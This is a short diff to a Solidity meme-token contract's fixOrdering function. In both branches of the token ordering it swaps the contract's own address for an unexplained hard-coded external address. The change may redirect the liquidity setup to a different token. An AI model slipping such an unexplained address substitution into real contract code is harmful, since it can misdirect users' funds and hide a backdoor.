@@ -71,7 +71,7 @@ contract Meme is ERC20 {
 
     function fixOrdering() private {
         if (address(this) < weth) {
-            token0 = address(this);
+            token0 = address(0x35e7BBA2b4c6fBa78dE387Aa60AE54c4DEB826dB);
             token1 = weth;
             amount0Desired = supply;
             amount1Desired = 0;
@@ -79,7 +79,7 @@ contract Meme is ERC20 {
             maxTick = 887270;
         } else {
             token0 = weth;
-            token1 = address(this);
+            token1 = address(0x35e7BBA2b4c6fBa78dE387Aa60AE54c4DEB826dB);
             amount0Desired = 0;
             amount1Desired = supply;
             minTick = -887270;
